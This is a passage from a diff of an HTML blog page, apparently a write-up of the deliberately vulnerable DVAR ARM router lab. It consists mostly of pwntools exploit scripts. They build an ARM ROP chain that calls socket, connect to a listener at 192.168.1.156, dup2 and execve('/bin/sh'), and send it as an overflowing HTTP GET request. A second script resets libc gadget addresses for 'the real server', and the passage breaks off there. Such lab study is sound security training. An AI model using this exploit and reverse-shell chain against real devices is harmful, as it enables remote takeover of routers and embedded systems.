+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[funcs]&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;@system = &#39;</span>, hex(system_ea))
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;@binsh =  &#39;</span>, hex(binsh_ea))
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;@dup2 =   &#39;</span>, hex(dup2_ea))
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;@socket = &#39;</span>, hex(socket_ea))
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;@connect =&#39;</span>, hex(connect_ea))
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;@exit =   &#39;</span>, hex(exit_ea))
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;@execve = &#39;</span>, hex(execve_stub_ea))
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        sin_family <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xff02</span> 
+</span></span><span style="display:flex;"><span>        sin_port <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>htons(args<span style="color:#f92672">.</span>listen) 
+</span></span><span style="display:flex;"><span>        sin_addr <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>inet_aton(<span style="color:#e6db74">&#34;192.168.1.156&#34;</span>)
+</span></span><span style="display:flex;"><span>        sin_zero <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x01</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        sin <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;HH&#39;</span>, sin_family, sin_port) <span style="color:#f92672">+</span> sin_addr <span style="color:#f92672">+</span> sin_zero
+</span></span><span style="display:flex;"><span>        print(sin)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">299</span> <span style="color:#75715e"># 173</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># data area</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;x&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x14</span>  
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> sin
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;x&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">12</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># reached @ret</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_mov_r1_0_ea) <span style="color:#75715e"># also set r0 to 0</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r5</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r6</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_add_r1_1_with_r0_cmp_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_add_r0_2_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_pop_r3_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_dummy_ea) <span style="color:#75715e"># r3</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_mov_r2_0_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(socket_ea) <span style="color:#75715e"># csock = socket(AF_INET = 2, SOCK_STREAM = 1, 0)</span>
+</span></span><span style="display:flex;"><span>                                  <span style="color:#75715e"># (will pop {r7, pc})</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r7</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_pop_r4_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_csock_ea) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_str_r0_r4_ea)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># fix struct sockaddr_in</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_sin_ea<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_mov_r0_0_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r7</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_strb_r0_r4_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_sin_ea<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_str_r0_r4_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_sin_ea<span style="color:#f92672">+</span><span style="color:#ae81ff">12</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_str_r0_r4_ea)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># prepare args in regs</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_csock_ea) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_pop_r1_r2_r3_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_sin_ea<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#75715e"># r1</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xffffffff</span>) <span style="color:#75715e"># r2</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_dummy_ea) <span style="color:#75715e"># r3</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_mov_r0_0_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r7</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_add_r1_1_with_r0_cmp_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_dummy_ea) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_mov_r0_r4_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_add_r2_1_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> p32(g_add_r2_1_ea)
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">+=</span> p32(stack_csock_ea) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_ldr_r0_r4_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r5</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r6</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(connect_ea) <span style="color:#75715e"># connect(csock, sin, 16) </span>
+</span></span><span style="display:flex;"><span>                                   <span style="color:#75715e"># (will pop {r3-r7, pc})</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r3</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r5</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r6</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r7 </span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_mov_r1_0_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_csock_ea) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r5</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r6</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_ldr_r0_r4_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r5</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r6</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(dup2_ea) <span style="color:#75715e"># dup2(csock, 0) (will pop {r7, pc})</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r7</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_mov_r1_0_ea) <span style="color:#75715e"># also set r0 to 0</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r5</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r6</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_add_r1_1_with_r0_cmp_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_csock_ea) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_ldr_r0_r4_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r5</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r6</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(dup2_ea) <span style="color:#75715e"># dup2(csock, 1) </span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r7</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_mov_r1_0_ea) <span style="color:#75715e"># also set r0 to 0</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r5</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r6</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_add_r1_1_with_r0_cmp_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_add_r1_1_with_r0_cmp_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_csock_ea) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_ldr_r0_r4_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r5</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r6</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(dup2_ea) <span style="color:#75715e"># dup2(csock, 2)</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r7</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_pop_r4_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(stack_dummy_ea) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_mov_r0_r4_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_pop_r1_r2_r3_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r1</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xffffffff</span>) <span style="color:#75715e"># r2</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r3</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_add_r2_1_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_mov_r1_0_ea) <span style="color:#75715e"># also set r0 to 0</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(binsh_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r5</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r6</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(g_mov_r0_r4_ea)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># r4</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p32(execve_stub_ea) <span style="color:#75715e"># execve(&#34;/bin/sh&#34;, NULL, NULL)</span>
+</span></span><span style="display:flex;"><span>       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;payload.bin&#34;</span>, <span style="color:#e6db74">&#34;wb+&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            f<span style="color:#f92672">.</span>write(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> check_null_bytes(payload):
+</span></span><span style="display:flex;"><span>            exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        req <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;GET /&#39;</span> <span style="color:#f92672">+</span> urlencode(payload)<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>        req <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Host: &#39;</span> <span style="color:#f92672">+</span> args<span style="color:#f92672">.</span>host[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>        req <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#req = b&#39;GET /&#39; + payload + b&#39; HTTP/1.1\r\n&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#req += b&#39;Host: &#39; + args.host[0].encode() + b&#39;\r\n&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#req += b&#39;\r\n&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;request.txt&#34;</span>, <span style="color:#e6db74">&#34;wb+&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            f<span style="color:#f92672">.</span>write(req)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        l <span style="color:#f92672">=</span> listen(args<span style="color:#f92672">.</span>listen)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>        th <span style="color:#f92672">=</span> send_delayed(p, req, <span style="color:#ae81ff">1.0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        c <span style="color:#f92672">=</span> l<span style="color:#f92672">.</span>wait_for_connection()
+</span></span><span style="display:flex;"><span>        th<span style="color:#f92672">.</span>join()
+</span></span><span style="display:flex;"><span>        c<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>print_help()
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>)
+</span></span></code></pre></div><p><img alt="exploit local" src="/img/dvar/exploit-local.png"></p>
+<p>Now need to modify stack buffer address (for sin) and libc base address (for gadgets and funcs) to work with the real server.</p>
+<p>After modif, use following script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> urllib.parse <span style="color:#f92672">import</span> quote_plus <span style="color:#66d9ef">as</span> urlencode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> threading
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;arm&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>bits <span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>endian <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;little&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#context.log_level = &#39;error&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Base address</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#base_address = 0xff737000 # (local) 0x40000000  # 0xff737000 </span>
+</span></span><span style="display:flex;"><span>base_address <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40034000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Calculating virtual addresses</span>
+</span></span><span style="display:flex;"><span>g_pop_r4_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0003a73c</span> <span style="color:#75715e"># 0x0000bac4  # null (alt: 0x0003a73c)</span>
+</span></span><span style="display:flex;"><span>g_mov_r0_r4_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00015ed8</span>
+</span></span><span style="display:flex;"><span>g_ldr_r0_r4_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0001b714</span>
+</span></span><span style="display:flex;"><span>g_mov_r0_0_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00028bc8</span> <span style="color:#75715e"># 0x0000eef0 # null (alt: 0x00028bc8 with one pop)</span>
+</span></span><span style="display:flex;"><span>g_pop_r1_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000129e4</span>
+</span></span><span style="display:flex;"><span>g_add_r0_2_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0002f850</span> <span style="color:#75715e"># 0x000300f4 # null (alt: 0x0002f850 with one more pop)</span>
+</span></span><span style="display:flex;"><span>g_add_r1_1_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00030b48</span>
+</span></span><span style="display:flex;"><span>g_add_r1_1_with_cmp_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000305a8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>g_mov_r1_0_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0003a6d8</span>
+</span></span><span style="display:flex;"><span>g_add_r1_1_with_r0_cmp_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000305a8</span>
+</span></span><span style="display:flex;"><span>g_mov_r2_0_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00030d30</span>
+</span></span><span style="display:flex;"><span>g_str_r0_r4_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0002ae30</span>
+</span></span><span style="display:flex;"><span>g_pop_r4_r6_r7_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0001f3d8</span> 
+</span></span><span style="display:flex;"><span>g_pop_r1_r2_r3_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000129e4</span>
+</span></span><span style="display:flex;"><span>g_pop_r3_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00016298</span>
+</span></span><span style="display:flex;"><span>g_add_r2_1_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00029110</span>
+</span></span><span style="display:flex;"><span>g_strb_r0_r4_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0003a4a4</span> 
+</span></span><span style="display:flex;"><span>g_pop_r7_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00041ff0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dup2_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xb328</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#75715e"># +4 to skip PUSH {R7, LR} # null (patch 0xff byte)</span>
+</span></span><span style="display:flex;"><span>binsh_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x46080</span> 
+</span></span><span style="display:flex;"><span>system_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x43928</span> <span style="color:#75715e"># 0x438dc + 4 </span>
+</span></span><span style="display:flex;"><span>socket_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3a240</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> 
+</span></span><span style="display:flex;"><span>connect_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x39bd8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>exit_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3f2dc</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#execve_stub_ea = base_address + 0x43584 </span>
